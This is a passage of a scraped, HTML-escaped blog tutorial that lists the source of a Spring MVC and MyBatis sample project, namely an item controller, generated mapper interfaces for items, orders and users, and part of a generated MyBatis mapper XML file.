&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.service.ItemService;

@Controller
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ItemController {
    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; ItemService Service;
    
    @RequestMapping(&lt;/span&gt;&quot;queryItem&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ModelAndView queryItem() {
        List&lt;/span&gt;&amp;lt;Item&amp;gt; itemList =&lt;span&gt; Service.queryItemList();
        ModelAndView mvAndView &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ModelAndView();
        mvAndView.addObject(&lt;/span&gt;&quot;itemList&quot;&lt;span&gt;, itemList);
        mvAndView.setViewName(&lt;/span&gt;&quot;item/item-list&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; mvAndView;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;com.cyb.ssm.mapper&lt;/h3&gt;
&lt;p&gt;路径：src/main/java&lt;/p&gt;
&lt;h4&gt;ItemMapper.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.mapper;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.Item;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.ItemExample;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.ibatis.annotations.Param;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; ItemMapper {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; countByExample(ItemExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deleteByExample(ItemExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deleteByPrimaryKey(Integer id);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; insert(Item record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; insertSelective(Item record);

    List&lt;/span&gt;&amp;lt;Item&amp;gt;&lt;span&gt; selectByExampleWithBLOBs(ItemExample example);

    List&lt;/span&gt;&amp;lt;Item&amp;gt;&lt;span&gt; selectByExample(ItemExample example);

    Item selectByPrimaryKey(Integer id);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExampleSelective(@Param(&quot;record&quot;) Item record, @Param(&quot;example&quot;&lt;span&gt;) ItemExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExampleWithBLOBs(@Param(&quot;record&quot;) Item record, @Param(&quot;example&quot;&lt;span&gt;) ItemExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExample(@Param(&quot;record&quot;) Item record, @Param(&quot;example&quot;&lt;span&gt;) ItemExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKeySelective(Item record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKeyWithBLOBs(Item record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKey(Item record);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;OrdersMapper.java&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.mapper;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.Orders;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.OrdersExample;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.ibatis.annotations.Param;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; OrdersMapper {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; countByExample(OrdersExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deleteByExample(OrdersExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deleteByPrimaryKey(Integer id);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; insert(Orders record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; insertSelective(Orders record);

    List&lt;/span&gt;&amp;lt;Orders&amp;gt;&lt;span&gt; selectByExample(OrdersExample example);

    Orders selectByPrimaryKey(Integer id);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExampleSelective(@Param(&quot;record&quot;) Orders record, @Param(&quot;example&quot;&lt;span&gt;) OrdersExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExample(@Param(&quot;record&quot;) Orders record, @Param(&quot;example&quot;&lt;span&gt;) OrdersExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKeySelective(Orders record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKey(Orders record);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;UserMapper.java&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.mapper;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.User;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.UserExample;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.ibatis.annotations.Param;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; UserMapper {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; countByExample(UserExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deleteByExample(UserExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deleteByPrimaryKey(Integer id);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; insert(User record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; insertSelective(User record);

    List&lt;/span&gt;&amp;lt;User&amp;gt;&lt;span&gt; selectByExample(UserExample example);

    User selectByPrimaryKey(Integer id);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExampleSelective(@Param(&quot;record&quot;) User record, @Param(&quot;example&quot;&lt;span&gt;) UserExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; updateByExample(@Param(&quot;record&quot;) User record, @Param(&quot;example&quot;&lt;span&gt;) UserExample example);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKeySelective(User record);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateByPrimaryKey(User record);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;ItemMapper.xml&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;142&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; &lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot; &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.mapper.ItemMapper&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;id &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;INTEGER&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;name&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;name&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;VARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;price&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;price&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;REAL&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;pic&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;pic&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;VARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;createtime&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;createtime&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;TIMESTAMP&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;ResultMapWithBLOBs&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt;&lt;span&gt; extends&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;detail&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;detail&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;LONGVARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;oredCriteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criteria&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;or&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criteria.valid&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; prefixOverrides&lt;/span&gt;&lt;span&gt;=&quot;and&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criteria.criteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criterion&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;choose &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.noValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.singleValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.betweenValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value} and #{criterion.secondValue}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.listValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criterion.value&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;listItem&quot;&lt;/span&gt;&lt;span&gt; open&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; close&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                    #{listItem}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;example.oredCriteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criteria&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;or&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criteria.valid&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; prefixOverrides&lt;/span&gt;&lt;span&gt;=&quot;and&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criteria.criteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criterion&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;choose &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.noValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.singleValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.betweenValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value} and #{criterion.secondValue}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.listValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criterion.value&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;listItem&quot;&lt;/span&gt;&lt;span&gt; open&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; close&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                    #{listItem}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    id, name, price, pic, createtime
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Blob_Column_List&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    detail
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByExampleWithBLOBs&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;ResultMapWithBLOBs&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.ItemExample&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;distinct&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      distinct
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    ,
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Blob_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    from item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;orderByClause != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      order by ${orderByClause}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByExample&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.ItemExample&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;distinct&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      distinct
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
